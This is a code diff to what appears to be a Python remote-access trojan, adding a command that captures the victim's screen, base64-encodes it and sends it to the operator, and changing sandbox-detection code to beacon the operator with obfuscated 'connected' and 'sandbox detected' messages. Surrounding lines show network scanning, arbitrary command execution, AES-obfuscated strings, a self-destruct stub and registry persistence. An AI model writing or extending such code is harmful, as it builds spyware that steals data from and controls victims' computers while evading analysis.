@@ -879,6 +879,14 @@ def run():
                 clients = scan(ip_range)
                 formatted_results = format_scan_results(clients)
                 send(formatted_results)
+            elif command == 'screenshot':
+                screenshot_path = os.path.join(os.getcwd(), 'screenshot.png')
+                screenshot = ImageGrab.grab()
+                screenshot.save(screenshot_path)
+                with open(screenshot_path, 'rb') as f:
+                    file_data = base64.b64encode(f.read()).decode('utf-8')
+                    send({"file_data": file_data})
+                os.remove(screenshot_path)
             else:
                 try:
                     result = run_command(command)
@@ -915,8 +923,10 @@ import winreg as reg
 if __name__ == '__main__':
     try:
         if is_sandbox():
-            print(aes_decrypt_string(obf_strings["sandbox_detected"], AES_KEY, AES_IV))
+            send(aes_decrypt_string(obf_strings["sandbox_detected"], AES_KEY, AES_IV))
             # self_destruct()
+        else:
+            send(aes_decrypt_string(obf_strings["connected"], AES_KEY, AES_IV))
 
         # add_to_registry()
 
